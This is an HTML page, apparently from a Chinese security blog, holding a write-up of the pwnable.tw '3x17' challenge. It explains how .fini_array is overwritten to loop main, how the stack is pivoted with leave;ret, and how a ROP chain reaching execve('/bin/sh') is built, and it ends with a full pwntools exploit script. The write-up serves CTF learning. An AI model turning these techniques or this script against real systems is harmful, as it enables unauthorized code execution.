@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw 部分记录">
+<meta property="og:url" content="http://yoursite.com/2020/04/11/pwnable-tw-部分记录/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-04-11T06:33:30.870Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw 部分记录">
+<meta name="twitter:description" content="二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/04/11/pwnable-tw-部分记录/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.tw 部分记录 | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/11/pwnable-tw-部分记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.tw 部分记录
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-11 10:19:03 / 修改时间：14:33:30" itemprop="dateCreated datePublished" datetime="2020-04-11T10:19:03+08:00">2020-04-11</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Collection/" itemprop="url" rel="index"><span itemprop="name">Collection</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>二进制是一个不断学习的过程，以下记录我在pwnable.tw网站刷题的一些心得</p>
+<a id="more"></a>
+<hr>
+<h1 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="main函数启动过程"><a href="#main函数启动过程" class="headerlink" title="main函数启动过程"></a>main函数启动过程</h3><pre><code>_start -&gt; __libc_start_main -&gt; __libc_csu_init -&gt; _init -&gt; main -&gt; __libc_csu_fini
+</code></pre><p>而其中 __libc_csu_init和__libc_csu_fini则会分别去调用.init / .init_array以及.fini / .fini_array。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This function should not be used anymore.  We run the executable's</span></span><br><span class="line"><span class="comment">   destructor now just like any other.  We cannot remove the function,</span></span><br><span class="line"><span class="comment">   though.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="keyword">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由上述elf-init的源码可以得知，__libc_csu_init调用.init_array是顺序调用，而__libc_csu_fini调用.fini_array是逆序调用。<br>即调用顺序为:</p>
+<ul>
+<li>.init</li>
+<li>.init_array[0]</li>
+<li>…</li>
+<li>.init_array[N]</li>
+<li>main</li>
+<li>.fini_array[N]</li>
+<li>…</li>
+<li>.fini_array[0]</li>
+<li>.fini</li>
+</ul>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h3><p>首先对文件进行检查</p>
+<pre><code>➜  3x17 file 3x17 
+3x17: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped
+➜  3x17 checksec 3x17 
+[*] &apos;/root/CTF/Pwn/tw/3x17/3x17&apos;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>可以发现是静态链接并且去除了符号等调试信息。在checksec时显示没有canary，其实是由于去除调试信息后未检测到。</p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>由于去掉调试信息，我们需要在RE的时候自己去找main函数。</p>
+<pre><code>.text:00000000004011D0                 public _start
+.text:00000000004011D0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:00000000004011D0 ; __unwind {
+.text:00000000004011D0                 xor     ebp, ebp
+.text:00000000004011D2                 mov     r9, rdx         ; rtld_fini
+.text:00000000004011D5                 pop     rsi             ; argc
+.text:00000000004011D6                 mov     rdx, rsp        ; ubp_av
+.text:00000000004011D9                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:00000000004011DD                 push    rax
+.text:00000000004011DE                 push    rsp             ; stack_end
+.text:00000000004011DF                 mov     r8, offset __libc_csu_fini ; fini
+.text:00000000004011E6                 mov     rcx, offset __libc_csu_init ; init
+.text:00000000004011ED                 mov     rdi, offset main ; main
+.text:00000000004011F4                 call    ___libc_start_main
+.text:00000000004011F9                 hlt
+.text:00000000004011F9 ; } // starts at 4011D0
+.text:00000000004011F9 _start          endp
+</code></pre><p>先看一下没有strip情况下的start。</p>
+<pre><code>.text:0000000000401A50                 public start
+.text:0000000000401A50 start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
+.text:0000000000401A50 ; __unwind {
+.text:0000000000401A50                 xor     ebp, ebp
+.text:0000000000401A52                 mov     r9, rdx
+.text:0000000000401A55                 pop     rsi
+.text:0000000000401A56                 mov     rdx, rsp
+.text:0000000000401A59                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:0000000000401A5D                 push    rax
+.text:0000000000401A5E                 push    rsp
+.text:0000000000401A5F                 mov     r8, offset sub_402960
+.text:0000000000401A66                 mov     rcx, offset loc_4028D0
+.text:0000000000401A6D                 mov     rdi, offset sub_401B6D
+.text:0000000000401A74                 db      67h
+.text:0000000000401A74                 call    sub_401EB0
+.text:0000000000401A7A                 hlt
+.text:0000000000401A7A ; } // starts at 401A50
+.text:0000000000401A7A start           endp
+</code></pre><p>这是3x17的start。<br>所以sub_401EB0应该就是__libc_start_main。<br>offset sub_402960就是 __libc_csu_fini,loc_4028D0是__libc_csu_init,sub_401B6D为main函数。</p>
+<p>进入到main函数，并对部分函数进行重命名。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rt1</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)++count;</span><br><span class="line">  <span class="keyword">if</span> ( count == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1u</span>, <span class="string">"addr:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x18</span>uLL);</span><br><span class="line">    v4 = (<span class="keyword">char</span> *)(<span class="keyword">signed</span> <span class="keyword">int</span>)sub_40EE70(&amp;buf, &amp;buf);</span><br><span class="line">    write(<span class="number">1u</span>, <span class="string">"data:"</span>, <span class="number">5u</span>LL);</span><br><span class="line">    argv = (<span class="keyword">const</span> <span class="keyword">char</span> **)v4;</span><br><span class="line">    *(_QWORD *)&amp;argc = <span class="number">0L</span>L;</span><br><span class="line">    read(<span class="number">0</span>, v4, <span class="number">0x18</span>uLL);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = v6 ^ v8;</span><br><span class="line">  <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    sub_44A3E0(*(_QWORD *)&amp;argc, argv, envp, v5);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>由于缺少符号不知道sub_40EE70函数功能，通过动态调试，sub_40EE70应该就是把输入的buf转化成数字。<br>整体逻辑就是往addr中写data，不过由于 count == 1的判断，只能够进行一次任意地址任意写。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="无限次写"><a href="#无限次写" class="headerlink" title="无限次写"></a>无限次写</h3><p>在前置知识中介绍了main函数启动的流程，在main函数结束时调用.fini_array[N]。<br>在这个程序中，.fini_array有两个元素。</p>
+<pre><code>.fini_array:00000000004B40F0 _fini_array     segment para public &apos;DATA&apos; use64
+.fini_array:00000000004B40F0                 assume cs:_fini_array
+.fini_array:00000000004B40F0                 ;org 4B40F0h
+.fini_array:00000000004B40F0 off_4B40F0      dq offset sub_401B00    ; DATA XREF: .text:000000000040291C↑o
+.fini_array:00000000004B40F0                                         ; __libc_csu_fini+8↑o
+.fini_array:00000000004B40F8                 dq offset sub_401580
+.fini_array:00000000004B40F8 _fini_array     ends
+</code></pre><p>在未修改.fini_array时的程序执行流程。</p>
+<pre><code>+---------------------+             +---------------------+              +---------------------+             +---------------------+
+|                     |             |                     |              |                     |             |                     |
+|       main          |  +--------&gt; |  __libc_csu_fini    |  +-------&gt;   |  .fini_array[1]     |  +-------&gt;  |   .fini_array[0]    |
+|                     |             |                     |              |                     |             |                     |
++---------------------+             +---------------------+              +---------------------+             +---------------------+
+</code></pre><p>我们进行如下修改。</p>
+<ul>
+<li>.fini_array[1] : main</li>
+<li>.fini_array[0] : __libc_csu_fini</li>
+</ul>
+<p>此时执行流程发生了改变。</p>
+<pre><code>+---------------------+             +---------------------+              +---------------------+             +---------------------+
+|                     |             |                     |              |                     |             |                     |
+|       main          |  +--------&gt; |  __libc_csu_fini    |  +-------&gt;   |  .fini_array[1]     |  +-------&gt;  |   .fini_array[0]    |
+|                     |             |                     |              |        main         |             |   __libc_csu_fini   |
++---------------------+             +---------------------+              +---------------------+             +---------------------+
+                                               ^                                                                         |
+                                               |                                                                         |
+                                               |                                                                         |
+                                               +-------------------------------------------------------------------------+
+</code></pre><p>这样便会一直进入到main函数。</p>
+<pre><code>result = (unsigned \__int8)++count;
+</code></pre><p>每次进入到main函数时 count+1，而且count是无符号int8类型。</p>
+<pre><code>0b11111111 + 1 = 0b00000000
+0b00000000 + 1 = 0b00000001
+</code></pre><p>当count==1时，便会停止等待输入addr。</p>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>我们能够无限次向任意地址写0x18大小的任意内容。<br>所以我们能够提前布置好ROP，最后跳转到布置ROP的地方触发ROP以get shell。</p>
+<pre><code>pop_rax_ret
+59
+pop_rdi_ret
+address of &quot;/bin/sh\x00&quot;
+pop_rsi_ret
+0
+pop_rdx_ret
+0
+syscall
+</code></pre><p>“/bin/sh\x00”随便布置在一块RW的区域就行。<br>关键是ROP布置在什么位置。<br>当我们布置完ROP后，再次进入到main，此时要修改.fini_array来改变程序流程。</p>
+<pre><code>.text:0000000000402960                 push    rbp
+.text:0000000000402961                 lea     rax, unk_4B4100
+.text:0000000000402968                 lea     rbp, off_4B40F0
+.text:000000000040296F                 push    rbx
+.text:0000000000402970                 sub     rax, rbp
+.text:0000000000402973                 sub     rsp, 8
+.text:0000000000402977                 sar     rax, 3
+.text:000000000040297B                 jz      short loc_402996
+.text:000000000040297D                 lea     rbx, [rax-1]
+.text:0000000000402981                 nop     dword ptr [rax+00000000h]
+.text:0000000000402988
+.text:0000000000402988 loc_402988:                             ; CODE XREF: __libc_csu_fini+34↓j
+.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0] ; fini_array
+</code></pre><p>观察上面代码，发现rbp被赋值为0x4B40F0(.fini_array)，再call调用相关函数。<br>这里考虑把.fini_array[0]修改为leave_ret(栈迁移)。<br>leave就是mov rsp,rbp; pop rbp;</p>
+<pre><code>mov    rsp,rbp    ; rbp = 0x4B40F0    , rsp = 0x4B40F0
+pop    rbp        ; rbp = [0x4B40F0]  , rsp = 0x4B40F8
+ret               ; rip = [0x4B40F8]  , rsp = 0x4B4100
+</code></pre><p>经过这些指令后，rip变为0x4B40F8里面存储的内容，rip指向.fini_array[1]。<br>在修改.fini_array[0]时同时修改.fini_array[1]为ret(pop rip)。<br>接着rip执行ret后rip = 0x4B4100。<br>所以我们把ROP链布置在0x4B4100区域。</p>
+<h2 id="Expliot"><a href="#Expliot" class="headerlink" title="Expliot"></a>Expliot</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> IPython <span class="keyword">import</span> embed <span class="keyword">as</span> ipy</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'IPython not installed.'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>] <span class="comment"># uncomment this if you use tmux</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># functions for quick script</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">''</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'./3x17'</span></span><br><span class="line"><span class="comment"># ctx.remote_libc = './libc.so'</span></span><br><span class="line"><span class="comment"># ctx.remote = ('1.1.1.1', 1111)</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span> <span class="comment"># True for debugging remote libc, false for local.</span></span><br><span class="line"></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_array = <span class="number">0x4B40F0</span></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">fake_esp = <span class="number">0x4B4100</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000041e4af</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401696</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000406c30</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000446e35</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">bin_sh_addr = <span class="number">0x00000000004B9300</span> <span class="comment"># .bss</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004022b4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    ru(<span class="string">"addr:"</span>)</span><br><span class="line">    s(str(addr))</span><br><span class="line">    ru(<span class="string">"data:"</span>)</span><br><span class="line">    s(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rs()</span><br><span class="line"><span class="comment"># rs('remote') # uncomment this for exploiting remote target</span></span><br><span class="line">write(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">write(bin_sh_addr,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">write(fake_esp,p64(pop_rax_ret))</span><br><span class="line">write(fake_esp+<span class="number">8</span>,p64(<span class="number">59</span>))</span><br><span class="line">write(fake_esp+<span class="number">16</span>,p64(pop_rdi_ret))</span><br><span class="line">write(fake_esp+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(fake_esp+<span class="number">32</span>,p64(pop_rsi_ret))</span><br><span class="line">write(fake_esp+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(fake_esp+<span class="number">48</span>,p64(pop_rdx_ret))</span><br><span class="line">write(fake_esp+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(fake_esp+<span class="number">64</span>,p64(syscall_addr))</span><br><span class="line"></span><br><span class="line">write(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/" rel="next" title="[KERNEL UAF]ciscn2017-babydriver">
